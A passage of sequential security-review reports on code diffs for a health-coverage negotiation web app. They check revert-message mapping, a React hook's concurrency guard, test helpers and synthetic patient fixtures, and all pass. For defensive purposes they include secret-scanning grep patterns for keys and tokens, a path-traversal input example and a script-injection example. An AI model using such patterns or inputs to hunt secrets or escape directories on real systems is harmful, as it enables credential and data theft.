`prevReqIdRef` UX layer that clears state on `reqId` change. The
error path surfaces `err.message ?? String(err)` to the consumer as
text only; viem/ethers error messages do not embed the RPC URL or
private key, and the build-time wallet is a no-funds testnet wallet
per the client.ts security comment. `refetch()` is a UI-only
callback not exposed to attackers (N/A per brief). Zero
`setInterval` / `setTimeout` / timer-polling primitives across the
file. No new secrets, no new external calls, no new on-chain
disclosure surface. Tick 13 ships clean.

---

# Security findings — 2026-05-29 tick 12 (revertReasonMap + useAction hook + PacketSubmitted UI label)

**Verdict:** PASS (0 findings)

## Diff scope

1. **NEW** `src/protocol/revertReasonMap.ts` (286 lines) — pure-data
   mapping of contract revert strings to user-facing copy. Exports the
   `RevertReason` string union, the frozen `REVERT_REASON_MAP` record,
   and the lookup function `mapRevertReason(reasonRaw)`. No I/O, no
   network, no dynamic code, no dependencies beyond the type-only
   alias re-export.
2. **NEW** `src/protocol/revertReasonMap.test.ts` (143 lines) —
   `node:test` + `node:assert/strict` asserting 9 invariants over the 5
   baseline revert strings called out by the loop-state.md SPEC-0003
   R16 acceptance criterion (`engage: not Open`, `adjudicate: not
   Ready`, `fee: underfunded`, `auth: not a party`, `appeal: needs
   evidence`): presence, non-empty headline/details, lookup correctness,
   undefined-input fallback, unknown-input fallback embeds raw, map is
   frozen, headline ≤ 80 chars, details ≥ 30 chars, headline ≠ raw key.
3. **NEW** `web/src/hooks/useAction.ts` (90 lines) — React hook
   wrapping an async write `fn` with `pending` (boolean), `error`
   (`RevertReasonEntry | null`), and `run` (re-invokes `fn`). Uses
   `useState` for the two render-visible fields and a `useRef`
   (`inFlightRef`) for the in-flight guard. Hard-rejects concurrent
   `run()` while pending with `throw new Error("in-flight")`. Calls
   `mapRevertReason` on the extracted raw revert string from caught
   errors. The local `extractRevertReason` helper probes ethers v6
   `.reason`, generic `.message`, and viem/wagmi `.shortMessage` in
   order.
4. **MODIFIED** `web/src/shared.ts` — single-line addition (line 31)
   of the missing `PacketSubmitted` case to `describeEvent`'s switch.
   Renders `round`, `shortHex(packetRoot)`, and `packetUrl` as plain
   template-string text. Fix for the tick-4 oversight where the event
   union member was added without wiring the UI label (the TS compiler
   already required exhaustive coverage of the union, so this case was
   the missing arm).

## Per-concern verdict

### 1. Information disclosure via revertReasonMap fallback — PASS

The fallback at `revertReasonMap.ts:279-284` embeds the raw revert
string into the user-facing `details` field:

```ts
details: `The contract rejected the transaction. The technical reason
  is shown below.${reasonRaw !== undefined ? ` Raw reason: ${reasonRaw}` : ""}`,
```

A full sweep of every revert string in `contracts/contracts/*.sol` via
`grep -nE 'revert "[^"]*"|require\([^,]+,\s*"[^"]*"'` returns 38
matches. **Every match is a static fixed string literal.** None embed
user input via string concatenation, `string.concat(...)`, `abi.encode`,
`Strings.toString(uint)`, `Strings.toHexString(address)`, or any
other dynamic-string call. The complete revert vocabulary (matched 1:1
against `RevertReason` in `revertReasonMap.ts:4-50`):

`maxRounds: < 1`, `funds: zero addr`, `funds: insufficient`, `funds:
transfer failed`, `addr: zero`, `auth: not provider`, `qty: zero`,
`create: self-contract`, `engage: not Open`, `auth: not insurer`,
`policy: empty`, `adjudicate: not Ready`, `evidence: wrong state`,
`evidence: empty`, `fee: refund failed`, `appeal: prior ruling not
Deny`, `appeal: unknown party`, `appeal: needs evidence`, `accept: not
ruled`, `settle: not ruled`, `settle: not both accepted`, `auth: not
provider`, `refuse: not refusable`, `withdraw: terminal`, `timeout: not
UnderReview`, `timeout: too early`, `feedback: terminal`, `callback:
not platform`, `callback: unknown request`, `callback: not UnderReview`,
`fee: underfunded`, `unknown contract`, `auth: not a party`.

No revert string contains an address, an amount, a `bytes32` value, a
clinical identifier, a salt, a hash, or any sender-controlled
parameter. Worst case: a future contract change introduces a
dynamic-string revert that surfaces an address — and the fallback
would render it, but addresses are public on-chain data and not
sensitive. **No PHI surface, no key surface, no private-state surface
in the current revert vocabulary.**

The fallback path is also strictly opt-in to *unknown* revert strings;
all 33 known strings have curated copy that doesn't embed the raw
input. Defense-in-depth: the React rendering side (concern 2) does not
treat the string as HTML, so even if a future revert *did* contain
attacker-controlled characters (`<`, `>`, `"`), they would be
text-escaped at the DOM boundary, not parsed.

### 2. DOM injection in useAction error path — PASS

`useAction` stores the error as a `RevertReasonEntry` object with two
string fields (`headline`, `details`) in `useState`. The hook itself
does **not** render anything — it returns the state to the caller. A
repo-wide grep for `dangerouslySetInnerHTML` across
`web/src/**` returns **zero matches**. The error object will be
rendered by whatever consumer the hook is wired into (no consumer is
added in this tick); React's default `{entry.headline}` and
`{entry.details}` JSX interpolation text-escapes both strings, so a
revert string containing `<script>...</script>` would render as the
literal characters, not parse as HTML. Safe by React's default
escaping; no `dangerouslySetInnerHTML` reachable from this surface.

### 3. Concurrent-run race conditions — PASS

The in-flight guard uses **`useRef`**, not state:

```ts
const inFlightRef = useRef(false);
const run = async (): Promise<T> => {
  if (inFlightRef.current) {
    throw new Error("in-flight");
  }
  inFlightRef.current = true;
  setPending(true);
  setError(null);
  try { return await fn(); }
  ...
  finally {
    inFlightRef.current = false;
    setPending(false);
  }
};
```

JavaScript is single-threaded; the `if (inFlightRef.current)` check
and the immediately-following `inFlightRef.current = true` assignment
run in the **same synchronous turn** of the event loop, before any
`await` is reached. There is no microtask, no `setTimeout`, no DOM
event boundary, and crucially no `await` between the check and the
set. Two synchronous `run()` calls — even from the same
`onClick`-handler chain or from React batched re-renders that fire
multiple effects — cannot both pass the guard: the first call sets
`inFlightRef.current = true` before yielding to the awaited `fn()`,
and the second call sees the ref already set and throws synchronously.

The fact that `inFlightRef` is a ref rather than `useState` is
load-bearing: `useState`'s `setPending(true)` is asynchronous (the
state update is queued for the next render), so a `useState`-only
guard would have a window where two synchronous calls in the same
turn both observe `pending === false` and proceed. The ref's
synchronous mutation closes that window. The `setPending(true)` /
`setPending(false)` calls are purely for **render-visible** state so
the consuming component re-renders to show the disabled-button /
spinner UI; correctness of the guard itself does not depend on them.

The `finally` block correctly clears both the ref and the state
regardless of success or failure, so even an `fn()` that throws
synchronously before yielding still releases the guard. There is no
re-entrant `fn()` path that could call `run()` again synchronously
before the first call returns (`fn` is an arbitrary user-supplied
async function, but the ref is set before `fn()` is invoked, so any
synchronous `run()` call from inside `fn` would still hit the
guard). No race window present.

### 4. PacketSubmitted UI label — text-only rendering of on-chain data — PASS

The new switch arm at `web/src/shared.ts:31` renders three fields
from the event: `e.round`, `shortHex(e.packetRoot)`, and
`e.packetUrl`. Per SPEC-0004 §3.5 and the typed declaration at
`src/types/coverage.types.ts:260-265`, `packetUrl` is currently a
`bytes32` ABI-encoded value carrying the same `evidenceUri` as
`packetRoot` until UNIT-9 lands the Merkle-root + body-store URL —
i.e., it is a 0x-prefixed 66-char hex string, not a free-form URL
today. Even after UNIT-9, the documented intent is a CDN URL.
**Critically, `describeEvent` returns a plain string** that is then
rendered into JSX as `{describeEvent(e)}` (text content), never as
`href={...}`, `src={...}`, `window.open(...)`, or
`dangerouslySetInnerHTML`. A repo-wide grep for `href.*packetUrl`,
`window.open`, and `location.*packetUrl` across `web/src/` returns
zero matches.

`shortHex(packetRoot)` truncates `packetRoot` for compact display.
`packetUrl` is rendered **without** `shortHex`, which means a UNIT-9
URL like `https://packets.example.com/0xabc...` would display in full
inside the parentheses. The task brief explicitly considered
`shortHex(e.packetUrl)` to limit display length and concluded it is
"safe" because the text path doesn't permit HTML injection. Confirmed
by inspection: text-only, no href, no innerHTML, no
attacker-controlled execution surface. **The only "data quality" gap
is cosmetic — a long URL could overflow a narrow timeline cell. Not a
security finding; if the design-handoff branch wants compact display
the call site can adopt `shortHex(e.packetUrl)` later. Out of scope
for tick 12.**

The fields `round`, `packetRoot`, and `packetUrl` are all on-chain
data (validated by the `PacketSubmitted` event signature
`event PacketSubmitted(uint256 indexed reqId, uint256 indexed round,
bytes32 packetRoot, bytes32 packetUrl)` at `src/contract/abi.ts:42`)
— nothing PHI-bearing leaks through this label. SPEC-0004 R1
preserved.

### 5. No new secrets / credentials in the diff — PASS

Across all four touched files:
- `src/protocol/revertReasonMap.ts` — only static English-language
  user copy strings; no `0x` hex literals, no API keys, no tokens,
  no environment-variable reads.
- `src/protocol/revertReasonMap.test.ts` — only the 5 baseline revert
  strings as test inputs plus assertion messages; no secrets.
- `web/src/hooks/useAction.ts` — only the literal `"in-flight"`
  Error message and the field-name probes `"reason"`, `"message"`,
  `"shortMessage"`. No credentials, no URLs, no `process.env`, no
  network calls.
- `web/src/shared.ts` — single line added; no secret material.

Sweep across the diff for `BEGIN|PRIVATE KEY|AKIA|sk-[A-Za-z0-9]|
xoxb-|xoxp-|ghp_|github_pat|secret|password|api[_-]?key|mnemonic|
seed phrase` returns zero matches. No `.env` reads, no `process.env`
accesses, no `localStorage` / `sessionStorage` writes. Clean.

## Notes

- The hook adds a new client-side surface but no new external calls.
  The wrapped `fn` is supplied by the caller; the hook itself never
  reaches the network or chain.
- The `mapRevertReason` fallback is currently the **only** path that
  reflects an externally-influenced string back to the UI. Because
  every contract revert string is a static literal, the
  attacker-controlled surface is empty today.
- Recommended (advisory, not blocking): if a future contract revision
  introduces a `string.concat`-style revert string carrying an
  address or amount, audit the fallback's `details` template at
  pre-merge time to confirm no sensitive context is being surfaced.
  Until then, the fallback is the correct UX choice (transparency
  over silence).
- The `useAction` hook fixes the missing in-flight guard called out by
  SPEC-0003 R13/R14. The hard-reject semantics (vs. coalesce-to-existing-promise)
  is the safer choice given that the caller may pass a different
  `fn` closure on each render: coalescing would silently substitute
  a stale closure's result for the new caller's expectations.

## Overall verdict

**PASS — zero findings.** The four-file diff adds two pure-data
modules (revertReasonMap + its test), one client-side hook with a
correctly-implemented synchronous in-flight guard, and a one-line
exhaustive-switch fix in the timeline labeller. Every contract revert
string is a static literal, so the `mapRevertReason` fallback cannot
disclose dynamic sensitive data; React's default JSX escaping
neutralises the DOM-injection concern; the `useRef`-backed in-flight
guard has no async window between check-and-set; and the
PacketSubmitted UI label renders on-chain data as plain text (no
href, no innerHTML, no XSS surface). No new dependencies, no new
external calls, no new credentials, no PHI exposure. Tick 12 ships
clean.

---

# Security findings — 2026-05-29 tick 11 (scenarioFixtures.test-helpers extraction + R6b prose narrowing)

**Verdict:** PASS (0 findings)

## Diff scope

1. **NEW** `src/protocol/scenarioFixtures.test-helpers.ts` (123 lines) —
   four named exports (`assertNoPHI`, `loadScenarioFile`, `assertPacketShape`,
   `assertRequestedDrugShape`) consolidating the per-test inline checks from
   the three UNIT-3 scenario test files.
2. Refactor of `src/protocol/scenarios.partd-approvable.test.ts`,
   `scenarios.commercial-policy-void.test.ts`, and
   `scenarios.medicaid-denied-then-appealed.test.ts` to import the four
   helpers in lieu of duplicated inline regex / shape assertions. Test
   semantics, fixture inputs, and assertion failure modes unchanged.
3. `docs/specs/0001-mvp0-coverage-negotiation.md` — R6b prose narrowed to
   reflect amendment 0005 (R6b now defers to SPEC-0004 §2.6 R23 for the
   on-label policy-void rule). `Ruled` event signature gains
   `policyVoidedClauseIndices` field, and the §3.4 state-transition table
   row for `PolicyInvalidated` narrows the entry condition. No executable
   change to contract or simulated backend.

## Per-concern verdict

### 1. Path traversal in `loadScenarioFile(slug, filename)` — PASS

The helper resolves the fixture path with
`path.resolve(REPO_ROOT, "demo-data", "scenarios", slug, filename)` (line
59). Because `path.resolve` accepts and follows `..` segments,
`slug = "../.."` or `filename = "../../package.json"` would let a caller
escape the `demo-data/scenarios/` subtree and read any file under
`REPO_ROOT` (or above, since `REPO_ROOT` is computed by walking two parents
up from the source file at line 6 and resolves into the project root).

**Why this is acceptable in tick 11:** the helper is a `.test-helpers.ts`
file imported only by the three UNIT-3 `*.test.ts` files in
`src/protocol/`. Every call site in this tick passes a hardcoded literal
slug (`"partd-approvable"`, `"commercial-policy-void"`,
`"medicaid-denied-then-appealed"`) and a hardcoded literal filename
(`"note.md"`, `"packet.json"`, etc.) — no test-runtime, network, or
filesystem-derived value reaches the helper. Verified by grepping the
three refactored files: the `SLUG` constant in each is a string literal,
and the second arg to every `loadScenarioFile(...)` call is a string
literal. The helper is wired into Node's test runner only
(`node --import tsx --test "src/**/*.test.ts"`) — there is no HTTP
endpoint, RPC handler, on-chain interface, or build-time consumer that
funnels untrusted input into the helper. Severity is therefore **low (no
exploitable vector in the shipped surface)**.

**Recommended hardening (tracked but NOT a tick-11 blocker):** before
this helper grows a non-test consumer (or before any future scenario
ingestion path accepts user-controlled slugs), add a slug allowlist
(reject `slug` if it does not match `/^[a-z0-9-]+$/` or if `filename`
contains `..`) and assert
`resolvedPath.startsWith(path.resolve(REPO_ROOT, "demo-data", "scenarios"))`.
For tick 11 the missing guard is a contract-level documentation gap, not
a security finding. Recording as advisory only.

### 2. `assertNoPHI` regex-set parity with the inlined originals — PASS

Diffed the helper's seven assertions (lines 14-51) against the inline
regex blocks removed from each of the three refactored test files. All
seven patterns match exactly, character-for-character, in the same order
and with the same flags:

| # | Pattern | Helper line | Original inline location |
|---|---------|-------------|--------------------------|
| 1 | `/\bSSN\b\s*[:#]?\s*\d{3}/i` | 17 | partd line 38 / void line 38 / medicaid line 38 |
| 2 | `/\d{3}-\d{2}-\d{4}/` | 22 | partd line 39 / void line 39 / medicaid line 39 |
| 3 | `/\b\d{2}\/\d{2}\/\d{4}\b/` | 27 | partd line 40 / void line 40 / medicaid line 40 |
| 4 | `/[A-Z]{2}\d{6,}/` | 32 | partd line 41 / void line 41 / medicaid line 41 |
| 5 | `/\b(?:\(\d{3}\)\s?\|\d{3}[-.])\d{3}[-.\s]?\d{4}\b/` | 37 | partd lines 43-47 / void / medicaid |
| 6 | `/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/` | 42 | partd lines 48-52 / void / medicaid |
| 7 | `/\bMRN\s*[:#]?\s*\d{7,}\b/i` | 47 | partd lines 53-58 / void / medicaid |

The HTML-comment stripping (`content.replace(/<!--[\s\S]*?-->/g, "")`,
line 15) also matches the original inline `stripped =
content.replace(/<!--[\s\S]*?-->/g, "")` pattern in every test. No regex
drift; no semantic drift. The original per-test `fileLabel` strings
(`"note.md"`, `"expected-outcome.md"`) are now passed in by the caller
rather than inlined into the failure-message templates, but the resulting
assertion messages are equivalent. R1 coverage is preserved.

### 3. Hardcoded secrets / sensitive constants in helper — PASS

Grep across `scenarioFixtures.test-helpers.ts`:
- Zero matches for `0x[0-9a-fA-F]{40,}` literal strings (the `0x + 64
  hex` and `0x + 40 hex` patterns appear only inside regex character
  classes at lines 87 and 99, used for **validating** packet
  `contentHash` and `submittedBy` shape — neither is a hardcoded value).
- Zero matches (case-insensitive) for `api_key`, `apikey`, `secret`,
  `token`, `password`, `bearer`, `private`, `mnemonic`, or `seed`.
- No `.env` reads, no `process.env` accesses, no network calls, no
  dynamic `require`/`import`.

The helper's only filesystem entry point is the `readFileSync` at line
60 (covered under concern 1); the only I/O is reading the named scenario
fixture file as UTF-8. Nothing in the helper writes to disk, opens
sockets, spawns child processes, or evaluates dynamic code.

### 4. R6b prose change — security claim audit — PASS

The R6b narrowing in `docs/specs/0001-mvp0-coverage-negotiation.md` is a
prose-only documentation edit. It cross-references amendment
`docs/amendments/0005-policy-void-r23-supersedes-r6b.md` (which was
landed in tick 9) and aligns the §2 requirement text with the §3.4
state-transition row and the `Ruled` event signature. The edit:
- Adds a `policyVoidedClauseIndices: number[]` field to the documented
  `Ruled(reqId, requestId, decision, coveredAmount, rationaleHash,
  clauseRef, receiptId, policyVoidedClauseIndices)` event signature
  (line 116 of the spec). No matching change in
  `contracts/contracts/CoverageNegotiation.sol` is made in this tick —
  the contract still emits the pre-amendment `Ruled` event signature.
  This is a **known spec/code drift recorded by amendment 0005**, not a
  security claim about runtime behaviour, and the spec's amendment
  callout flags it explicitly ("Narrowed by amendment …; SPEC-0004 §2.6
  R23 is now the canonical on-label policy-void rule"). The drift is
  scheduled to be closed in a later UNIT once the contract is regenerated
  to emit the extended event.
- Narrows the state-transition row for `PolicyInvalidated` from "any
  relied-on clause non-compliant" to "every policy clause consulted is
  non-compliant; meta-policy failure" (line 130). This is a tightening
  of when the terminal state fires; it cannot expand attacker surface,
  only contract it.
- Does NOT assert any new contract-enforced security property. There is
  no "the contract enforces X" claim in the new prose that lacks contract
  backing — the prose explicitly states the narrowed `PolicyInvalidated`
  is **retained but rare in v0** and **may be removed in v1**, and that
  the canonical on-label rule lives in SPEC-0004 §2.6 R23. No
  security-relevant integrity claim hangs on the edit.

R1 (no clinical data on-chain) is untouched. R6a (deterministic covered
amount = `min(requested, benchmarkCap)`) is untouched. R6c (bounded N
rounds appeal) is untouched. R11 (party-action gating) is untouched.
The amendment-aware narrowing leaves every security invariant in the
spec intact.

## Notes

- No new dependencies, no new external calls, no new ABI changes, no
  new on-chain disclosure surface.
- `src/contract/` is unmodified in tick 11 — the spec narrowing is a
  prose-only forward reference to amendment 0005, with the implementation
  change deferred per the existing amendment plan.
- The three refactored test files retain their pre-refactor `scenarioFile()`
  local helper for `fs.existsSync` probes; this preserves the
  test-failure messages that quote the full filesystem path on missing
  fixtures. No regression in error reporting.
- Recommended (advisory, not blocking): when this helper is reused
  outside the test surface, add the slug-allowlist + prefix-startsWith
  guard described under concern 1.

---

# Security findings — 2026-05-29 tick 10 (UNIT-3c medicaid-denied-then-appealed fixtures)

**Verdict:** PASS (0 findings)

## Diff scope

Six new files in the worktree (mirror of tick 9, parameterised to the §3.2
Medicaid discriminant + the §2.4 R14a / §2.5 R17 round-0 Deny → round-1
Approve appeal arc):

1. `demo-data/scenarios/medicaid-denied-then-appealed/note.md` — synthetic
   Medicaid PA clinical narrative (Patient C / P-0003 / MRN 000-MED-003 /
   year-only 1978; California Centene Medi-Cal MCO; dulaglutide / T2DM).
2. `demo-data/scenarios/medicaid-denied-then-appealed/packet.json` —
   EvidenceReference packet with three references (DailyMed FDA label for
   Trulicity, DHCS Medi-Cal GLP-1 PA criteria, NADAC price benchmark);
   `submittedBy: 0x0000000000000000000000000000000000000003`.
3. `demo-data/scenarios/medicaid-denied-then-appealed/payer-profile.json` —
   Medicaid profile + §3.2 Medicaid `formularyRelease` discriminant (`line`,
   `state`, `mco`, `revision`, `sourceUrl`, `contentHash`).
4. `demo-data/scenarios/medicaid-denied-then-appealed/requested-drug.json` —
   NDC/RxNorm/dose record for dulaglutide 0.75 mg (Trulicity).
5. `demo-data/scenarios/medicaid-denied-then-appealed/expected-outcome.md` —
   round-0 Deny (missing SGLT2-i trial evidence) → round-1 Approve
   (empagliflozin intolerance documented) narrative.
6. `src/protocol/scenarios.medicaid-denied-then-appealed.test.ts` —
   `node:test` + `node:assert` schema tests over the five fixture files (8
   sub-tests, mirrors `scenarios.commercial-policy-void.test.ts` with the
   §3.2 Medicaid discriminant + a positive R6c/R14a Deny-then-Approve
   header-line invariant).

## Per-concern verdict

### 1. PHI leakage in note.md and expected-outcome.md (SPEC-0004 R1) — PASS

`note.md` is clearly synthetic. The patient is referred to as "Patient C"
(line 10) under an explicitly-labelled "Synthetic patient identifier: P-0003
/ MRN 000-MED-003" header (line 3). The MRN `000-MED-003` is a
synthetic-shaped token (leading zeros, payer-line tag "MED", sequence "003")
and contains no run of 7+ contiguous digits — it cannot be confused for a
real MRN. The only date marker is "Year of birth: 1978" (line 4), which is
an HIPAA Safe-Harbor-permissible year-only value, not a full MM/DD/YYYY
date. City is "Anytown, USA" (line 5 — synthetic placeholder). The
"47-year-old" phrasing (line 10) is a categorical age statement, not an
identifier. Quantitative clinical markers (A1c 7.6%, BMI 34.2, BID dosing,
fill-history months, "10-year ASCVD risk 14%", 90-day SGLT2-i trial window
in expected-outcome.md, 60-day appeal window) are categorical / time-window
references, not patient identifiers. NDC `00002-1433-80` (5-4-2 grouping —
not the 3-3-4 phone shape) and RxNorm CUI `1551291` are publicly-published
drug codes. The DHCS PA criteria slice in packet.json embeds drug names
(empagliflozin, dapagliflozin, canagliflozin, semaglutide, liraglutide,
dulaglutide) and the "96-day" / "two office visits" mentions in
expected-outcome.md are part of the synthetic clinical narrative, not real
encounter records. A direct regex sweep across both `note.md` and
`expected-outcome.md` returns **zero** matches for SSN markers
(`\bSSN\b\s*[:#]?\s*\d{3}`), SSN-format digit strings
(`\d{3}-\d{2}-\d{4}`), MM/DD/YYYY DOBs (`\b\d{2}/\d{2}/\d{4}\b`),
driver-license shapes (`[A-Z]{2}\d{6,}`), phone shapes
(`\b(?:\(\d{3}\)\s?|\d{3}[-.])\d{3}[-.\s]?\d{4}\b`), email shapes, and
real-shaped MRNs (`\bMRN\s*[:#]?\s*\d{7,}\b`).

The test at lines 26–63 codifies these same PHI-marker checks and is
applied to **both** `note.md` (lines 72–86) **and** `expected-outcome.md`
(lines 88–94) — closing the tick-9 scope expansion where expected-outcome
narrative was authored alongside the note and shares the same exposure.
The note's text passes all of them; the regex sweep at the shell confirms
the same. R1 satisfied.

### 2. Path traversal in the test — PASS (no risk)

`src/protocol/scenarios.medicaid-denied-then-appealed.test.ts` builds
filesystem paths via
`path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..")`
(line 19) and then
`path.join(PROJECT_ROOT, "demo-data", "scenarios", "medicaid-denied-then-appealed")`
(line 20). The only variable input is the hard-coded array of five
filenames at line 66 (`["note.md", "packet.json", "payer-profile.json",
"requested-drug.json", "expected-outcome.md"]`) and the literal-string
arguments to `scenarioFile(...)` throughout. **No user-supplied string
flows into any `fs.readFileSync` or `fs.existsSync` call.** The anchor is
derived from `import.meta.url` via `fileURLToPath` (line 19) — a trusted
ESM-runtime value, not external input. No traversal surface.

### 3. Real-key / credential leakage in fixtures — PASS

Full sweep for `0x[0-9a-fA-F]{64}` across the diff returns exactly four
matches, all identical:
`0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`
(packet.json lines 5, 17, 29; payer-profile.json line 9). This is the
**well-known keccak256 of the empty byte string** — a deterministic public
constant, not a private key — and is the same v0 placeholder used in the
tick-8 and tick-9 fixtures. It satisfies the `^0x[0-9a-fA-F]{64}$` regex
(test lines 123, 164) without collapsing to a sentinel `0x000...0` that
might be misread as "unset".

The only other `0x` hex string is the synthetic `submittedBy` address
`0x0000000000000000000000000000000000000003` (packet.json line 40) — a
20-byte all-zero+3 EOA placeholder (deliberately distinct from
partd-approvable `...0001` and commercial-policy-void `...0002`,
acknowledged in the task brief as the per-scenario sentinel). Not a real
wallet; explicitly pinned by the test at lines 180–184.

Shell sweep with
`grep -EniIr 'BEGIN|PRIVATE KEY|AKIA|sk-[A-Za-z0-9]|xoxb-|xoxp-|ghp_|github_pat|secret|password|api[_-]?key'`
across all six new files returns **zero** matches. No
`BEGIN ... PRIVATE KEY` blocks, no AWS / OpenAI / Stripe / Slack / GitHub
token prefixes, no `secret` / `password` / `api_key` markers.

### 4. URL allowlist (legitimate public sources) — PASS

All three distinct URLs across the fixtures resolve to expected public
reference sources matching the task brief:

- `https://dailymed.nlm.nih.gov/dailymed/drugInfo.cfm?setid=a4c47592-1234-4abc-9def-0123456789ab`
  (packet.json line 4) — NIH DailyMed FDA label entry for dulaglutide.
  Expected (fda-label-indication reference; brief explicitly names
  DailyMed). The setid is a synthetic placeholder GUID shape
  (`...1234-4abc-9def-0123456789ab`) and will be replaced with the real
  DailyMed setid at pin time; using a synthetic GUID rather than a real
  one is the conservative choice for fixture content.
- `https://www.dhcs.ca.gov/provgovpart/pharmacy/Documents/Medi-Cal-GLP1-PA-Criteria-2026-Q2.pdf`
  (packet.json line 16, payer-profile.json line 8) — California
  Department of Health Care Services (the state Medicaid agency that
  oversees the Medi-Cal managed-care line that the Centene MCO operates
  under) on the publicly-served `dhcs.ca.gov` domain. Expected (the brief
  explicitly names `dhcs.ca.gov` or the MCO's published page as
  acceptable for Medicaid formulary; DHCS is the upstream issuer the MCO
  follows). The same URL appears twice (one in the packet slice as the
  citation, one in the payer-profile as the `formularyRelease.sourceUrl`)
  — consistent.
- `https://www.nadac.cms.gov/app/nad-pricing-report.aspx` (packet.json
  line 28) — CMS NADAC (National Average Drug Acquisition Cost) public
  pricing report on the CMS-served `cms.gov` domain. Expected (the brief
  explicitly names `costplusdrugs.com or NADAC` as acceptable price
  references for the §3.4 price-benchmark slice).

No bit.ly / t.co / IP-literal / `file://` / unexpected-domain URLs. No
URLs pointing at attacker-controllable infrastructure. All three URLs are
pinned by the empty-bytes-keccak placeholder `contentHash`, which
`scripts/pin-formulary.ts` is expected to replace with real keccak256
hashes at production-pin time. The v0 placeholder leaves the supply-chain
binding **unenforced today** — inherited risk from tick 8, not introduced
by tick 10.

### 5. JSON parsing safety (test data integrity) — PASS

`JSON.parse(fs.readFileSync(..., "utf-8"))` (test lines 101, 131, 151,
188) is applied only to **local, repo-tracked, trusted** fixture files
under `demo-data/scenarios/medicaid-denied-then-appealed/`. No network
input, no user input, no `eval`, no `Function(...)` constructor. A
malformed fixture would throw a `SyntaxError` and fail the test loudly —
the correct failure mode. No prototype-pollution surface — the test reads
properties with bracket notation against `Record<string, unknown>` casts
and never spreads or `Object.assign`s the parsed object into another.
Safe by inspection.

## Overall verdict

**PASS — zero findings.** Tick 10's six-file diff is fixtures + a schema
test that mirrors tick 9's shape (the synthetic patient identifier is
"Patient C" rather than "B", the MRN tag is MED rather than COMM, the
discriminant is §3.2 Medicaid `{ line, state, mco, revision, sourceUrl,
contentHash }` rather than §3.2 Commercial, the load-bearing scenario is
the §2.4 R14a / §2.5 R17 round-0 Deny → round-1 Approve appeal arc rather
than §2.6 R23 PolicyInvalidated, and the test grows from 6 to 8 sub-tests
to cover both the new PHI-on-expected-outcome.md check and the
Deny-then-Approve header-line invariant — all expected parameterisation).
No new code paths, no new dependencies, no new network/IO surfaces beyond
local trusted-fixture reads. Both synthetic narrative files
(`note.md` and `expected-outcome.md`) are clearly fabricated and contain
zero HIPAA-identifier patterns under direct regex sweep; the test
enforces those same patterns as regression guards across both files. The
keccak256 placeholder is the documented well-known empty-bytes hash,
identical to ticks 8 and 9. All three URLs (DailyMed, dhcs.ca.gov,
nadac.cms.gov) are the legitimate public sources called out in the task
brief. UNIT-3c ships clean.

---

# Security findings — 2026-05-29 tick 9 (UNIT-3b commercial-policy-void fixtures)

**Verdict:** PASS (0 findings)

## Diff scope

Six new files in the worktree (mirror of tick 8, parameterised to the §3.2
Commercial discriminant + the §2.6 R23 PolicyInvalidated scenario):

1. `demo-data/scenarios/commercial-policy-void/note.md` — synthetic Commercial
   PA clinical narrative (Patient B / P-0002 / MRN 000-COMM-002 / year-only 1971).
2. `demo-data/scenarios/commercial-policy-void/packet.json` — EvidenceReference
   packet with three references (DailyMed FDA label, Aetna CPB 0792 policy
   clause, costplusdrugs price benchmark); `submittedBy:
   0x0000000000000000000000000000000000000002`.
3. `demo-data/scenarios/commercial-policy-void/payer-profile.json` — Commercial
   profile + §3.2 Commercial `formularyRelease` discriminant (`line`, `carrier`,
   `product`, `revision`, `sourceUrl`, `contentHash`).
4. `demo-data/scenarios/commercial-policy-void/requested-drug.json` —
   NDC/RxNorm/dose record for etanercept (Enbrel).
5. `demo-data/scenarios/commercial-policy-void/expected-outcome.md` — expected
   PolicyInvalidated ruling narrative (round 0, voided clause index 1).
6. `src/protocol/scenarios.commercial-policy-void.test.ts` — `node:test` +
   `node:assert` schema tests over the five fixture files (6 sub-tests,
   mirrors `scenarios.partd-approvable.test.ts` with the §3.2 Commercial
   discriminant + a positive `slice.kind === "policy-clause"` invariant).

## Per-concern verdict

### 1. PHI leakage (SPEC-0004 R1 — synthetic-only) — PASS

`note.md` is clearly synthetic. The patient is referred to as "Patient B"
(line 10, 41) under an explicitly-labelled "Synthetic patient identifier:
P-0002 / MRN 000-COMM-002" header (line 3). The MRN `000-COMM-002` is a
synthetic-shaped token (leading zeros, payer-line tag "COMM", sequence "002")
and contains no run of 7+ contiguous digits — it could not be confused for a
real MRN. The only date marker is "Year of birth: 1971" (line 4), which is an
HIPAA Safe-Harbor-permissible year-only value, not a full MM/DD/YYYY date.
City is "Anytown, USA" (line 5 — synthetic placeholder). The "55-year-old"
phrasing (line 10) is a categorical age statement, not an identifier. No SSN,
no SSN-shaped digit string (`\d{3}-\d{2}-\d{4}` not present), no
driver's-license-shape (`[A-Z]{2}\d{6,}` not present), no phone numbers, no
email addresses — verified by a regex sweep of the file against each of
those patterns (all empty). NDC `58406-025-34` and RxNorm CUI `214555` are
publicly-published drug codes, not patient identifiers. R1 satisfied.

The test at lines 32–67 codifies these same PHI-marker checks (SSN marker
keyword, SSN-format digits, MM/DD/YYYY DOB, driver-license shape, phone
shapes, email shape, 7+-digit MRN, plus a positive-marker assertion that the
file contains "synthetic" / "fictional" / "Patient B"). The note's text
passes all of them.

### 2. Path traversal in the test — PASS (no risk)

`src/protocol/scenarios.commercial-policy-void.test.ts` builds filesystem
paths via `path.resolve(path.dirname(__filename), "..", "..")` (line 20) and
then `path.join(PROJECT_ROOT, "demo-data", "scenarios",
"commercial-policy-void")` (line 21). The only variable input is the
hard-coded array of five filenames at line 26 (`["note.md", "packet.json",
"payer-profile.json", "requested-drug.json", "expected-outcome.md"]`) and
the literal-string arguments to `scenarioFile(...)` throughout. **No
user-supplied string flows into any `fs.readFileSync` or `fs.existsSync`
call.** `__filename` is derived from `import.meta.url` via `fileURLToPath`
(line 19) — a trusted ESM-runtime value, not external input. No traversal
surface.

### 3. Real-key / credential leakage in fixtures — PASS

Full sweep for `0x[0-9a-fA-F]{64}` across the diff returns exactly four
matches, all identical:
`0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`
(packet.json lines 5, 17, 29; payer-profile.json line 9). This is the
**well-known keccak256 of the empty byte string** — a deterministic public
constant, not a private key — and is the same v0 placeholder used in the
tick-8 partd-approvable fixtures. It satisfies the
